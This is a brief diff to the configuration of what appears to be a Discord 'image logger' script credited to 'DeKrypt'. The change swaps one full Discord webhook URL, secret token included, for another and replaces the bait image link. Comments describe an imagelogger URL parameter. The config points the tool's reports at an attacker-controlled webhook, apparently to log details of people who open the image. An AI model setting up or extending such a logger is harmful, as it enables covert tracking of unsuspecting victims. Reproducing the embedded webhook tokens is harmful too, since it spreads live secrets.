@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1159594862715347035/SrGRhTgiifMiF8JSCGuKHWUjcfIeU5ecrkfvmwiJOiKdTQzm3xD8-6zZWl8GUXh_OAsg",
-    "image": "https://gamertweak.com/wp-content/uploads/2021/10/How-to-Play-Discord-Snake-Game-404.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1199033145983516813/adj55gsOsBMzmHVemDQkaybyK4KAXK0eirXHtPMLYb94z9HeD0wkFqf74pcIOhR3f44S",
+    "image": "https://i.redd.it/2atjz02sk9u21.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
